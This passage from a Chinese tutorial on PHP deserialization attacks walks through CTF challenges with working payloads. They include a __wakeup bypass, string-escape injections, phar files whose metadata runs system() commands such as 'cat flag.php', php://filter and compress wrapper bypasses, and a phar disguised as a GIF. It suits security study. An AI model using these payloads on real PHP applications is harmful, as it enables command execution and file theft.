一、基础
====

1、简介
----

序列化其实就是将数据转化成一种可逆的数据结构，自然，逆向的过程就叫做反序列化。php 将数据序列化和反序列化会用到两个函数：serialize 将对象格式化成有序的字符串；unserialize 将字符串还原成原来的对象。序列化的目的是方便数据的传输和存储，在PHP中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。

2、序列化的格式
--------

```php
<?php
$user=array('xiao','shi','zi');
$user=serialize($user);
echo($user.PHP_EOL);
print_r(unserialize($user));

/*
输出：
a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
Array
(
[0] => xiao
[1] => shi
[2] => zi
)

a:3:{i:0;s:4:"xiao";i:1;s:3:"shi";i:2;s:2:"zi";}
a:array代表是数组，后面的3说明有三个属性
i:代表是整型数据int，后面的0是数组下标
s:代表是字符串，后面的4是因为xiao长度为4
依次类推
*/
```

序列化后的内容只有成员变量，没有成员函数，比如下面的例子：

```php
<?php
class test{
public $a;
public $b;
function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
?>

/*
输出：
O:4:"test":2:{s:1:"a";s:9:"xiaoshizi";s:1:"b";s:8:"laoshizi";}
```

而如果变量前是protected，则会在变量名前加上\\x00\*\\x00,private则会在变量名前加上\\x00类名\\x00,输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式，如下：

```php
<?php
class test{
protected $a;
private $b;
function __construct(){$this->a = "xiaoshizi";$this->b="laoshizi";}
function happy(){return $this->a;}
}
$a = new test();
echo serialize($a);
echo urlencode(serialize($a));
?>

/*
输出：
O:4:"test":2:{s:4:" * a";s:9:"xiaoshizi";s:7:" test b";s:8:"laoshizi";}
O%3A4%3A%22test%22%3A2%3A%7Bs%3A4%3A%22%00%2A%00a%22%3Bs%3A9%3A%22xiaoshizi%22%3Bs%3A7%3A%22%00test%00b%22%3Bs%3A8%3A%22laoshizi%22%3B%7D
*/
```

3、魔术方法
------

```php
__construct() //对象被实例化时触发
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```

二、反序列化漏洞利用（绕过）
==============

1、php7.1+反序列化对类属性不敏感
--------------------

前面说了如果变量前是protected，序列化结果会在变量名前加上\\x00\*\\x00，但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00\*\\x00也依然会输出abc。

```php
<?php
class test{
protected $a;
public function __construct(){
$this->a = 'abc';
}
public function __destruct(){
echo $this->a;
}
}
unserialize('O:4:"test":1:{s:1:"a";s:3:"abc";}');

#输出：abc
```

例题：\[网鼎杯 2020 青龙组\]AreUSerialz

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

首先找到可利用的危险函数\*\*file\_get\_content()\*\*然后逐步回溯发现是\_\_destruct()--&gt; process()--&gt;read()这样一个调用过程。

两个绕过：1.\_\_destruct()中要求op！===2且process()中要求op==2

这样用$op=2绕过

2.绕过is\_valid()函数，private和protected属性经过序列化都存在不可打印字符在32-125之外，但是对于PHP版本7.1+，对属性的类型不敏感，我们可以将protected类型改为public，以消除不可打印字符。

```php
<?php
class FileHandler {
  public $op = 2;
  public $filename = "/var/www/html/flag.php";
  public $content;
}
$obj = new FileHandler();
echo serialize($obj);
?>
/*输出：
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:22:"/var/www/html/flag.php";s:7:"content";N;}
*/
```

```php
<?php
class FileHandler {

    public $op=2;
    public $filename="php://filter/read=convert.base64-encode/resource=flag.php";
    public $content;

}

$obj = new FileHandler();
echo serialize($obj);
?>
/*输出：
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
*/
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-31e65fabd63c36943186e61b8cd592f61a38250e.png)

2、绕过\_\_wakeup(CVE-2016-7124)
-----------------------------

```php
版本：
PHP5 < 5.6.25
PHP7 < 7.0.10
```

利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过\_\_wakeup的执行。

对于下面这样一个自定义类：

```php
<?php
class test{
public $a;
public function __construct(){
$this->a = 'abc';
}
public function __wakeup(){
$this->a='666';
}
public function __destruct(){
echo $this->a;
}
}
$t='O:4:"test":1:{s:1:"a";s:4:"yyds";}';
unserialize($t);
```

如果执行unserialize('O:4:"test":1:{s:1:"a";s:4:"yyds";}');输出结果为666；

而把对象属性个数的值增大执行unserialize('O:4:"test":2:{s:1:"a";s:4:"yyds";}');输出结果为yyds。

例题：\[极客大挑战 2019\]PHP

题目给出提示，网站存在备份。用dirsearch扫描出存在www.zip 备份文件，下载下来开始审计。

index.php里规定了反序列化的参数,而且调用了class.php

```php

<head>
  <meta charset="UTF-8">
  <title>I have a cat!</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
      <link rel="stylesheet" href="style.css">
</head>
<style>
    #login{   
        position: absolute;   
        top: 50%;   
        left:50%;   
        margin: -150px 0 0 -150px;   
        width: 300px;   
        height: 300px;   
    }   
    h4{   
        font-size: 2em;   
        margin: 0.67em 0;   
    }
</style>
<body>

<div id="world">
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;">因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;">不愧是我！！！
    </div>
    <div style="text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;">
    <?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
    </div>
    <div style="position: absolute;bottom: 5%;width: 99%;"><p align="center" style="font:italic 15px Georgia,serif;color:white;"> Syclover @ cl4y</p></div>
</div>
<script src='http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js'></script>
<script src='http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js'></script>
<script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js'></script>
<script  src="index.js"></script>
</body>
</html>
```

解题的重点看来就在class.php中了

```php
<?php
include 'flag.php';

error_reporting(0);

class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

        }
    }
}
?>

<?php
    include 'class.php';
    $select = $_GET['select'];
    $res=unserialize(@$select);
    ?>
```

审计源码我们可以得出,当username=admin且password=100时得到flag,但是 weakup()魔术方法会把username重置为guest,因此我们需要绕过weakup()。

先构造payload生成序列化字符串

```php
<?php
class Name {

private $username='admin';
private $password=100;

}
$a=new Name;
echo serialize($a);

?>

/*输出：
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
*/
```

最终传入的序列化字符串：

```php
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

加上%00是因为username和password都是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失且本题的php版本低于7.1

3、绕过部分正则
--------

preg\_match('/^O:\\d+/')匹配序列化字符串是否是对象字符串开头,这在曾经的CTF中也出过类似的考点

### 利用加号绕过

注意在url里传参时+要编码为%2B

```php
$a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}'; //+号绕过 
$b = str_replace('O:4','O:+4', $a);
unserialize(match($b));
```

### serialize( array( a) );

a为要反序列化的对象（序列化结果开头是a，不影响作为数组元素的$a的析构）

```php
serialize(array($a));
unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```

### 利用引用使两值恒等

```php
<?php
class test{
    public $a;
    public $b;
    public function __construct(){
        $this->a = 'abc';
        $this->b= &$this->a;
    }
    public function  __destruct(){

    if($this->a===$this->b){
        echo 666;
   }
}
}
$a = serialize(new test());
```

上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等

### 16进制绕过字符过滤

```php
O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
可以写成
O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
表示字符类型的s大写时，会被当成16进制解析。
```

4、反序列化字符逃逸
----------

当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。

### 反序列化字符变多逃逸案例

假设我们先定义一个user类，然后里面一共有3个成员变量：username、password、isVIP。

```php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}
```

可以看到当这个类被初始化的时候，isVIP变量默认是0，并且不受初始化传入的参数影响。

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

$a = new user("admin","123456");
$a_seri = serialize($a);

echo $a_seri;
?>
```

这一段程序的输出结果如下：

```php
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

可以看到，对象序列化之后的isVIP变量是0。

这个时候我们增加一个函数，用于对admin字符进行替换，将admin替换为hacker，替换函数如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hacker",$s);
}

$a = new user("admin","123456");
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

这一段程序的输出为：

```php
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

这个时候我们把这两个程序的输出拿出来对比一下：

```php
O:4:"user":3:{s:8:"username";s:5:"admin";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}  //未过滤
O:4:"user":3:{s:8:"username";s:5:"hacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //已过滤
```

可以看到已过滤字符串中的hacker与前面的字符长度不对应了

```php
s:5:"admin";
s:5:"hacker";
```

在这个时候，对于我们，在新建对象的时候，传入的admin就是我们的可控变量

接下来明确我们的目标：将isVIP变量的值修改为1

首先我们将我们的现有子串和目标子串进行对比：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //现有子串
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标子串
```

也就是说，我们要在admin这个可控变量的位置，注入我们的目标子串。

首先计算我们需要注入的目标子串的长度：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
//以上字符串的长度为47
```

因为我们需要逃逸的字符串长度为47，并且admin每次过滤之后都会变成hacker，也就是说每出现一次admin，就会多1个字符。

因此我们在可控变量处，重复47遍admin，然后加上我们逃逸后的目标子串，可控变量修改如下：

```php
adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}
```

完整代码如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hacker",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);
echo $a_seri;
echo '------------------------------------------------------------';
echo $a_seri_filter;
?>
```

输出结果为

```php
O:4:"user":3:{s:8:"username";s:282:"adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}

O:4:"user":3:{s:8:"username";s:282:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

我们可以数一下hacker的数量，一共是47个hacker，共282个字符，正好与前面282相对应。

后面的注入子串也正好完成了逃逸。

反序列化后，多余的子串会被抛弃

我们接着将这个序列化结果反序列化，然后将其输出，完整代码如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hacker",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);
$a_seri_filter_unseri = unserialize($a_seri_filter);

var_dump($a_seri_filter_unseri);
?>
```

程序输出如下：

```php
object(user)#2 (3) {
  ["username"]=>
  string(282) "hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
}
```

可以看到这个时候，isVIP这个变量就变成了1，反序列化字符逃逸的目的也就达到了。

例题

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
class a
{
    public $uname;
    public $password;
    public function __construct($uname,$password)
    {
        $this->uname=$uname;
        $this->password=$password;
    }
    public function __wakeup()
    {
            if($this->password==='yu22x')
            {
                include('flag.php');
                echo $flag; 
            }
            else
            {
                echo 'wrong password';
            }
        }
    }
function filter($string){
    return str_replace('Firebasky','Firebaskyup',$string);
}
$uname=$_GET[1];
$password=1;
unserialize(filter(serialize(new a($uname,$password))));
?> wrong password
```

想办法把password='yu22x'传进去，payload为：

```php
FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky";s:8:"password";s:5:"yu22x";}
```

### 过滤后字符变少

首先，和上面的主体代码还是一样，还是同一个class，与之有区别的是过滤函数中，我们将hacker修改为hack。

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('admin','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

输出结果：

```php
O:4:"user":3:{s:8:"username";s:5:"hack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

同样比较一下现有子串和目标子串：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;} //现有子串
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标子串
```

因为过滤的时候，将5个字符删减为了4个，所以和上面字符变多的情况相反，随着加入的admin的数量增多，现有子串后面会缩进来。

计算一下目标子串的长度：

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标子串
//长度为47
```

再计算一下到下一个可控变量的字符串长度：

```php
";s:8:"password";s:6:"
//长度为22
```

因为每次过滤的时候都会少1个字符，因此我们先将admin字符重复22遍（这里的22遍不像字符变多的逃逸情况精确，后面可能会需要做调整）

完整代码如下：（这里的变量里一共有22个admin）

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','123456');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

输出结果：

```php
O:4:"user":3:{s:8:"username";s:110:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

注意：PHP反序列化的机制是，比如如果前面是规定了有10个字符，但是只读到了9个就到了双引号，这个时候PHP会把双引号当做第10个字符，也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。

这里我们需要仔细看一下s后面是110，也就是说我们需要读取到110个字符。从第一个引号开始，110个字符如下：

```php
hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:6:"
```

也就是说123456这个地方成为了我们的可控变量，在123456可控变量的位置中添加我们的目标子串

```php
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //目标子串
```

完整代码为：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

输出：

```php
O:4:"user":3:{s:8:"username";s:110:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-ff5bd4c85172cc621f2cf80dcb2f7efc21929e7e.png)

选中部分一共有111个字符，

造成这种现象的原因是：替换之前我们目标子串的位置是123456，一共6个字符，替换之后我们的目标子串显然超过10个字符，所以会造成计算得到的payload不准确

解决办法是：多添加1个admin，这样就可以补上缺少的字符。

修改后代码如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);

echo $a_seri_filter;
?>
```

分析一下输出结果：

```php
O:4:"user":3:{s:8:"username";s:115:"hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

可以看到，这样就对了。

我们将对象反序列化然后输出，代码如下：

```php
<?php
class user{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u,$p){
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($s){
    return str_replace("admin","hack",$s);
}

$a = new user('adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin','";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$a_seri = serialize($a);
$a_seri_filter = filter($a_seri);
$a_seri_filter_unseri = unserialize($a_seri_filter);

var_dump($a_seri_filter_unseri);
?>
```

得到结果：

```php
object(user)#2 (3) {
  ["username"]=>
  string(115) "hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack";s:8:"password";s:47:""
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
}
```

可以看到，这个时候isVIP的值也为1，也就达到了我们反序列化字符逃逸的目的了

**tips：数组逃逸闭合要加一个}，即用";}闭合**

三、对象注入
======

当用户的请求在传给反序列化函数unserialize()之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的unserialize函数，最终导致一个在该应用范围内的任意PHP对象注入。对象注入类似于一个利用反序列化魔术方法进行变量覆盖的过程。

对象漏洞出现得满足两个前提

1、unserialize的参数可控。2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。

给出一个案例帮助理解

```php
<?php
class A{
    var $test = "y4mao";
    function __destruct(){
        echo $this->test;
    }
}
$a = 'O:1:"A":1:{s:4:"test";s:5:"maomi";}';
unserialize($a);
```

在脚本运行结束后便会调用\_destruct函数，同时会覆盖test变量输出maomi

四、phar反序列化
==========

phar，全称为PHP Archive，phar扩展提供了一种将整个PHP应用程序放入.phar文件中的方法，以方便移动、

安装。.phar文件的最大特点是将几个文件组合成一个文件的便捷方式，.phar文件提供了一种将完整的PHP程

序分布在一个文件中并从该文件中运行的方法。

1、phar文件结构
----------

1、stub

一个供phar扩展用于识别的标志，格式为xxx&lt;?php xxx; \_\_HALT\_COMPILER();?&gt;，前面内容不限，但必须以

\_\_HALT\_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。

2、manifest

phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列

化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。

3、contents

被压缩文件的内容。

4、signature

签名，放在文件末尾

2、利用方法
------

可利用原因：

使用phar://伪协议解析phar文件时对meta-data进行反序列化操作

利用方法：

将要序列化的内容写入meta-data中，再使用phar伪协议进行反序列化。首先需要生成phar文件，

在php的配置文件中需要设置phar.readonly= Off。

```php
<?php
class A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
$a = new A();
$a->a='ls';
$phar = new Phar("test.phar");//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$phar->setMetadata($a);//将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

可以触发phar伪协议的函数包括：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-249275942d3ab93fe4484a29b0678bc313d87458.png)

但实际上只要调用了php\_stream\_open\_wrapper的函数，都存在这样的问题。因此还有以下函数：

```php

exif
exif_thumbnail
exif_imagetype

gd
imageloadfont
imagecreatefrom

hash
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file

file / url
get_meta_tags
get_headers
mime_content_type

standard
getimagesize
getimagesizefromstring

finfo
finfo_file
finfo_buffer

zip
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');

Postgres
<?php
$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
@$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');

MySQL
LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper
<?php
class A {
    public $s = '';
    public function __wakeup () {
        system($this->s);
    }
}
$m = mysqli_init();
mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
$s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
$p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
再配置一下mysqld。（非默认配置）
[mysqld]
local-infile=1
secure_file_priv=""
```

例题：

```php
<?php
//flag in flag.php
error_reporting(0);
highlight_file(__FILE__);
class A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
if(isset($_GET['file'])) {
    if(strstr($_GET['file'], "flag")) {
        die("Get out!");
    }
    echo file_get_contents($_GET['file']);
}

if(isset($_FILES['file'])) {
    mkdir("upload");
    $uuid = uniqid();
    $ext = explode(".", $_FILES["file"]["name"]);
    $ext = end($ext);
    move_uploaded_file($_FILES['file']['tmp_name'], "upload/".$uuid.".".$ext);
    echo "Upload Success! FilePath: upload/".$uuid.".".$ext;
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" value="load" />
</form>
</body>

</html>
```

```php
<?php
class A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
$a = new A();
$a->a='ls';
$phar = new Phar("test.phar");//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$phar->setMetadata($a);//将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

上传后进行包含

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-e2680221ccfb0f09d1e055dadd093b2c98bac9cd.png)

```php
<?php
class A {
    public $a;

    public function __destruct()
    {
        system($this->a);
    }
}
$b = new A();
$b->a='cat flag.php';
$phar = new Phar("test4.phar");//后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER();?>");//设置stub
$phar->setMetadata($b);//将自定义的meta-data存入manifest
$phar->addFromString("test4.txt", "test4");//添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?>
```

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-a8174e59e8ade8f4dca10d826a6181daaff99bfe.png)

查看源代码：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-91d6071b346ca0cb372b6d79b79a66847f28b676.png)

3、过滤绕过
------

### 当环境限制了phar不能出现在前面的字符里

```php
compress.bzip://phar:///test.phar/test.txt
compress.bzip2://phar:///test.phar/test.txt
compress.zlib://phar:///home/sx/test.phar/test.txt
php://filter/resource=phar:///test.phar/test.txt
php://filter/read=convert.base64-encode/resource=phar://phar.phar
```

### 验证文件格式

php识别phar文件是通过其文件头的stub，更确切一点来说是\_\_HALT\_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。如下：

```php
<?php
    class TestObject {
    }

    @unlink("phar.phar");
    $phar = new Phar("phar.phar");
    $phar->startBuffering();
    $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
    $o = new TestObject();
    $phar->setMetadata($o); //将自定义meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

可以看到加了GIF89a文件头，从而使其伪装成gif文件：

![图片.png](https://shs3.b.qianxin.com/attack_forum/2024/05/attach-85f71b01da15bb5199904bc0015e826fe589e7f8.png)

五、session反序列化
=============

1、序列化和反序列化session机制
-------------------

